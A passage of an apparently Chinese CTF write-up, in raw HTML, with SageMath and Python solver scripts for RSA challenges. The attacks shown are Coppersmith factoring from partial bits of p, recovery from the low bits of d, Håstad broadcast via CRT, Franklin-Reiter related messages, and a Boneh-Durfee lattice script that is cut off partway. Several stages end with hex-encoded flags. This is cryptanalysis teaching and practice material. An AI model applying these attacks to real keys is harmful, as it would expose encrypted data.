class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>n=<span class="hljs-number">23412744196435681035016886220643400350970797545501310013304272571425348967576484268142400640552976798425045608274973517284025831498467236341911890721102753724816097043557304340791745423642403094886324667586890743441181879275819905523857289371181975206153946416492759491324890990771260876302417738635652747674766470906230972589393979314947350143584541009374774851236081699644040090877016127125997472439169352089823014941009458298353952133084702487229994974065020835757669357061533853531708873378901690969236981895123027779256185848480947387458247076558510061941953938352870386545064169169200268143031918794825270298631</span><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">9398872900480694514053766636015808474916722324451384224067138680826665766000870773107410167898882406270257015221891892085001459713583625341362117117871802743137635415088841771727308157301268300094318585426138274238719361978001009950762135079902183427948096280119330118607820781873262983642485251440958841901313115939514261290900440121234463088422361021316299407329969835177481638764778578537907012916110360538977789500099230565812930941982075719936200613719978050626787999136833805067940187341360786050332115552930420848777154904971863171308444262963588775160727678158622484428491558915905860791139989357158989913050</span><br>high_p=<span class="hljs-number">136232996027545975004563119617198627048065138315684770279122430141624103589614249447456579821863618044683199820893874027883593009896002870850519475109346672955929930383822711173403482003043608577119957883570354552011936964395584718847162648784196596548570670949314203035203058272377061576666254342055958413312</span><br>unknown_bits=<span class="hljs-number">128</span><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = high_p + x<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br><span class="hljs-keyword">if</span> x:<br>    p=<span class="hljs-built_in">int</span>(high_p+x[<span class="hljs-number">0</span>])<br>    q=n//p<br>    phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    d=invert(e,phi)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n))).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#4e53534354467b32393537633039333964393165633765633331306462356630616130303637627d</span><br></code></pre></td></tr></table></figure><h3 id="ç¬¬å››æ­¥"><a class="markdownIt-Anchor" href="#ç¬¬å››æ­¥"></a> ç¬¬å››æ­¥</h3><p>dä½ä½æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage    </span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getFullP</span>(<span class="hljs-params">low_p, n</span>):<br>    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="hljs-string">&#x27;NTL&#x27;</span>)<br>    p = x * <span class="hljs-number">2</span> ^ bit + low_p<br>    root = (p - n).monic().small_roots(X=<span class="hljs-number">2</span> ^ <span class="hljs-number">128</span>, beta=<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> root:<br>        <span class="hljs-keyword">return</span> p(root[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phase4</span>(<span class="hljs-params">low_d,n,c,e</span>):<br>    maybe_p = []<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>):<br>        p = var(<span class="hljs-string">&#x27;p&#x27;</span>)<br>        p0 = solve_mod([<span class="hljs-number">3</span> * p * low_d == p + k * (n * p - p ^ <span class="hljs-number">2</span> - n + p)], <span class="hljs-number">2</span> ^ bit)<br>        maybe_p += [<span class="hljs-built_in">int</span>(x[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> p0]<br>    <span class="hljs-comment"># print(maybe_p)</span><br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> maybe_p:<br>        P = getFullP(x, n)<br>        <span class="hljs-keyword">if</span> P: <span class="hljs-keyword">break</span><br><br>    P = <span class="hljs-built_in">int</span>(P)<br>    Q = n // P<br><br>    <span class="hljs-keyword">assert</span> P * Q == n<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;P = &quot;</span>,P)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Q = &quot;</span>,Q)<br><br>    d = inverse_mod(<span class="hljs-number">3</span>, (P - <span class="hljs-number">1</span>) * (Q - <span class="hljs-number">1</span>))<br>    m = <span class="hljs-built_in">pow</span>(c,d,n)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)).<span class="hljs-built_in">hex</span>())<br><br>low_d = <span class="hljs-number">9973904680412152570138003136466059609611257944928836300634423080561298749075958309067426603113525684100417494741123226214436236190592552869975926519409611</span><br>bit = low_d.nbits()<br>n = <span class="hljs-number">114977856718774899746007273258142027119221291891045313370664580956945773892016230637680441795343679791416907107771431518072494779758596070931073345264743927090857036312767418019303974408803896285561003981790474474879254339898650912349447554900342592699419248042230565484734565275290033575309907770959979249441</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">279116358436840580443869403482689523417926943370283952754967172903129298280404573580346506496192282092683784627132866212050801891387341516024550585731142831756181412863049450540988286305848774162564019517973339661098414905264661903203165067354388671494408807585235845183100544469908026469</span><br><br>phase4(low_d,n,c,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;over&quot;</span>)<br><br><span class="hljs-comment">#P =  9391440826233377371336657018726228044955035660871483031200545194209412258251390818401701331464535153201228754160435275219818869242505918168666443009326573</span><br><span class="hljs-comment">#Q =  12242834602929509975987801546676877090198837325930397169155103539567125515140067665313945532401676516599948815186229719968852154887325536081734280242134917</span><br><span class="hljs-comment">#4e53534354467b35613766336538663162393366623031373734353635393137353330373233657d</span><br><br></code></pre></td></tr></table></figure><h3 id="ç¬¬äº”æ­¥"><a class="markdownIt-Anchor" href="#ç¬¬äº”æ­¥"></a> ç¬¬äº”æ­¥</h3><p>ä¸­å›½å‰©ä½™å®šç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n1=<span class="hljs-number">70150782017106744702286811194970924795928560711094108957698212389450273692062768369571246611319149038648327761674152952339905197695826737596960300577409503979703942545335432723800249192593500405582765931990758208650822157232981240732073491803602882507450974334286908867409590191359365352766613583499469290527</span><br>c1=<span class="hljs-number">279116358436840580122801369030860797071717129802018282437018488673976577326106718472074964408957326212618048865436045226170032031901019679413199602348078729644581348770787396528963958874221694545619137696961058855467066695666042795471835004925286023187346469299975149390451496495239926629</span><br>n2=<span class="hljs-number">162923886897767641573990199711208966404485491217179966579970401560714596746048441376917770043182383221870895215113078186461513007410215100878491414297440280939964180092659379220178207225568061030068648967857348433089303371603266843183223035463682063557841392298863456665960447294704243819193928375408330671631</span><br>c2=<span class="hljs-number">279116358436840580122801369030860797071717129802018282437018488673976577326106718472074964408957326212618048865436045226170032031901019679413199602348078729644581348770787396528963958874221694545619137696961058855467066695666042795471835004925286023187346469299975149390451496495239926629</span><br>n3=<span class="hljs-number">64753773112870123671946228401261981403081286742676725931583667929772070753859231199873341111781336775967007272149447053104007491713851164173612962580712278731622434533504364107395371718249464189400149469043191006088911663789316310304257096522277791717333432302300795390616581016561592287175185617125932272419</span><br>c3=<span class="hljs-number">279116358436840580122801369030860797071717129802018282437018488673976577326106718472074964408957326212618048865436045226170032031901019679413199602348078729644581348770787396528963958874221694545619137696961058855467066695666042795471835004925286023187346469299975149390451496495239926629</span><br><br>c=[c1,c2,c3]<br>n=[n1,n2,n3]<br><span class="hljs-comment">#ä½¿ç”¨ä¸­å›½ä½™æ•°å®šç†è®¡ç®—mçš„eæ¬¡æ–¹</span><br>x = crt([n1, n2, n3], [c1, c2, c3], check=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(iroot(x[<span class="hljs-number">0</span>],<span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h3 id="ç¬¬å…­æ­¥"><a class="markdownIt-Anchor" href="#ç¬¬å…­æ­¥"></a> ç¬¬å…­æ­¥</h3><p>mç›¸å…³æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">m1=a1*m+b1</span><br><span class="hljs-string">m2=a2*m+b2</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>n=<span class="hljs-number">26847996488880447216096776732070281545074976645749840223230511101684036430699982494901520391374124676936370320908977030678422411113870898677919949108092307560814359856349235904175523637127826401779533321668448534998775648599423127487483632410155870352622828098410769325273126586866498178208776567574352828392125983672996446308065758934722526747310236556876750508203459413705807255650618685650750523570744211286546519649176886249835233519536394639538776259162929144979062059559775101414000670212721128884382352735794626563622728463436421772307972139931705536741059161551098795715075350442339804773649281544806370921391</span><br>a1=<span class="hljs-number">1</span><br>b1=<span class="hljs-number">0</span><br>c1=<span class="hljs-number">24732899138985698048124738358885344459379493315054027124307662756312751844141022376300081819454686750145220818897973180537017198314231472874483596104799907859093488291789788924219598121824323245537546195418486119678702901179691397376775826957705715693979193211784497213599547621382217619658749166534139290785718885852449894739032293904252938440995047190420058143769116751715376151332965862901010949911088033051288770545272582507845444790953964807440668028480049740511795701814222210845363937718599750472068452173181280703803935942166980836867264796046582678020913725095981275231662933966865789526710944092564302745232</span><br>a2=<span class="hljs-number">1</span><br>b2=<span class="hljs-number">1</span><br>c2=<span class="hljs-number">24732899138985698048124738358885344459380038656644856424408162261290252390990430221618386418951988486708762804946769795228623929192434866679235654403422358739678505705164771770043997911978466970263295500889794171343156703395546382916487920614340043903229000609973485677050397022152713772292440520988456316443753468532951303866181082256920212000750824864649908289233351736589192406643159754938503633933659274738581869079639832724262163525528275737821041039669564305836146099495364809454904417807419660442462148929999131337816672689722132290589330769444419576849369335967968005614246785108998860303333448365564289184539</span><br>e=<span class="hljs-number">7</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">franklinReiter</span>(<span class="hljs-params">n,e,a1,b1,c1,a2,b2,c2</span>):<br>    PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>    g1 = (a1*x+b1)^e - c1<br>    g2 = (a2*x+b2)^e - c2<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">g1, g2</span>):<br>        <span class="hljs-keyword">while</span> g2:<br>            g1, g2 = g2, g1 % g2<br>        <span class="hljs-keyword">return</span> g1.monic() <span class="hljs-comment"># </span><br>    <span class="hljs-keyword">return</span> -gcd(g1, g2)[<span class="hljs-number">0</span>]<br><br>m=franklinReiter(n,e,a1,b1,c1,a2,b2,c2)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#4e53534354467b61323430373434306566643666343139323861323262333463373761303966347d</span><br></code></pre></td></tr></table></figure><h3 id="ç¬¬ä¸ƒæ­¥"><a class="markdownIt-Anchor" href="#ç¬¬ä¸ƒæ­¥"></a> ç¬¬ä¸ƒæ­¥</h3><p>æˆ‘åˆ†ä¸ºäº†ä¸¤æ­¥</p><h4 id="71æ±‚phin"><a class="markdownIt-Anchor" href="#71æ±‚phin"></a> 7.1æ±‚phin</h4><p>æ¿å­ç”¨æ³•ï¼šattack(n, e, 512, 2, 0.270,10)</p><p>512æ˜¯nçš„å› æ•°çš„ä½æ•°</p><p>2æ˜¯nçš„å› æ•°çš„ä¸ªæ•°</p><p>0.270æ˜¯dçš„é‚£ä¸ªèŒƒå›´</p><p>10å¯ä»¥è¡¨ç¤ºæ·±åº¦ï¼Œè¶Šå¤§è¶Šå‡†ç¡®ä½†æ—¶é—´è¶Šä¹…ï¼Œä¸€èˆ¬å–4æ²¡å‡ºå°±å–10ï¼Œè¿™é‡Œå–4æ˜¯å¯ä»¥å‡ºçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment">############################################</span><br><span class="hljs-comment"># Config</span><br><span class="hljs-comment">##########################################</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Setting debug to true will display more informations</span><br><span class="hljs-string">about the lattice, the bounds, the vectors...</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>debug = <span class="hljs-literal">True</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Setting strict to true will stop the algorithm (and</span><br><span class="hljs-string">return (-1, -1)) if we don&#x27;t have a correct</span><br><span class="hljs-string">upperbound on the determinant. Note that this</span><br><span class="hljs-string">doesn&#x27;t necesseraly mean that no solutions</span><br><span class="hljs-string">will be found since the theoretical upperbound is</span><br><span class="hljs-string">usualy far away from actual results. That is why</span><br><span class="hljs-string">you should probably use `strict = False`</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>strict = <span class="hljs-literal">False</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">This is experimental, but has provided remarkable results</span><br><span class="hljs-string">so far. It tries to reduce the lattice as much as it can</span><br><span class="hljs-string">while keeping its efficiency. I see no reason not to use</span><br><span class="hljs-string">this option, but if things don&#x27;t work, you should try</span><br><span class="hljs-string">disabling it</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>helpful_only = <span class="hljs-literal">True</span><br>dimension_min = <span class="hljs-number">7</span> <span class="hljs-comment"># stop removing if lattice reaches that dimension</span><br><br><span class="hljs-comment">############################################</span><br><span class="hljs-comment"># Functions</span><br><span class="hljs-comment">##########################################</span><br><br><span class="hljs-comment"># display stats on helpful vectors</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">helpful_vectors</span>(<span class="hljs-params">BB, modulus</span>):<br>    nothelpful = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">if</span> BB[ii,ii] &gt;= modulus:<br>            nothelpful += <span class="hljs-number">1</span><br><br>    <span class="hljs-built_in">print</span>(nothelpful, <span class="hljs-string">&quot;/&quot;</span>, BB.dimensions()[<span class="hljs-number">0</span>], <span class="hljs-string">&quot; vectors are not helpful&quot;</span>)<br><br><span class="hljs-comment"># display matrix picture with 0 and X</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_overview</span>(<span class="hljs-params">BB, bound</span>):<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        a = (<span class="hljs-string">&#x27;%02d &#x27;</span> % ii)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">1</span>]):<br>            a += <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> BB[ii,jj] == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;X&#x27;</span><br>            <span class="hljs-keyword">if</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">60</span>:<br>                a += <span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            a += <span class="hljs-string">&#x27;~&#x27;</span><br>        <span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment"># tries to remove unhelpful vectors</span><br><span class="hljs-comment"># we start at current = n-1 (last vector)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_unhelpful</span>(<span class="hljs-params">BB, monomials, bound, current</span>):<br>    <span class="hljs-comment"># end of our recursive function</span><br>    <span class="hljs-keyword">if</span> current == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt;= dimension_min:<br>        <span class="hljs-keyword">return</span> BB<br><br>    <span class="hljs-comment"># we start by checking from the end</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(current, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># if it is unhelpful:</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            affected_vectors = <span class="hljs-number">0</span><br>            affected_vector_index = <span class="hljs-number">0</span><br>            <span class="hljs-comment"># let&#x27;s check if it affects other vectors</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                <span class="hljs-comment"># if another vector is affected:</span><br>                <span class="hljs-comment"># we increase the count</span><br>                <span class="hljs-keyword">if</span> BB[jj, ii] != <span class="hljs-number">0</span>:<br>                    affected_vectors += <span class="hljs-number">1</span><br>                    affected_vector_index = jj<br><br>            <span class="hljs-comment"># level:0</span><br>            <span class="hljs-comment"># if no other vectors end up affected</span><br>            <span class="hljs-comment"># we remove it</span><br>            <span class="hljs-keyword">if</span> affected_vectors == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;* removing unhelpful vector&quot;</span>, ii)<br>                BB = BB.delete_columns([ii])<br>                BB = BB.delete_rows([ii])<br>                monomials.pop(ii)<br>                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">return</span> BB<br><br>            <span class="hljs-comment"># level:1</span><br>            <span class="hljs-comment"># if just one was affected we check</span><br>            <span class="hljs-comment"># if it is affecting someone else</span><br>            <span class="hljs-keyword">elif</span> affected_vectors == <span class="hljs-number">1</span>:<br>                affected_deeper = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(affected_vector_index + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                    <span class="hljs-comment"># if it is affecting even one vector</span><br>                    <span class="hljs-comment"># we give up on this one</span><br>                    <span class="hljs-keyword">if</span> BB[kk, affected_vector_index] != <span class="hljs-number">0</span>:<br>                        affected_deeper = <span class="hljs-literal">False</span><br>                <span class="hljs-comment"># remove both it if no other vector was affected and</span><br>                <span class="hljs-comment"># this helpful vector is not helpful enough</span><br>                <span class="hljs-comment"># compared to our unhelpful one</span><br>                <span class="hljs-keyword">if</span> affected_deeper <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="hljs-built_in">abs</span>(bound - BB[ii, ii]):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="hljs-string">&quot;and&quot;</span>, affected_vector_index)<br>                    BB = BB.delete_columns([affected_vector_index, ii])<br>                    BB = BB.delete_rows([affected_vector_index, ii])<br>                    monomials.pop(affected_vector_index)<br>                    monomials.pop(ii)<br>                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                    <span class="hljs-keyword">return</span> BB<br>    <span class="hljs-comment"># nothing happened</span><br>    <span class="hljs-keyword">return</span> BB<br><br><span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">Returns:</span><br><span class="hljs-string">* 0,0   if it fails</span><br><span class="hljs-string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span><br><span class="hljs-string">* x0,y0 the solutions of `pol`</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boneh_durfee</span>(<span class="hljs-params">pol, modulus, mm, tt, XX, YY</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Boneh and Durfee revisited by Herrmann and May</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    finds a solution if:</span><br><span class="hljs-string">    * d &lt; N^delta</span><br><span class="hljs-string">    * |x| &lt; e^delta</span><br><span class="hljs-string">    * |y| &lt; e^0.5</span><br><span class="hljs-string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># substitution (Herrman and May)</span><br>    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)<br>    Q = PR.quotient(x*y + <span class="hljs-number">1</span> - u) <span class="hljs-comment"># u = xy + 1</span><br>    polZ = Q(pol).lift()<br><br>    UU = XX*YY + <span 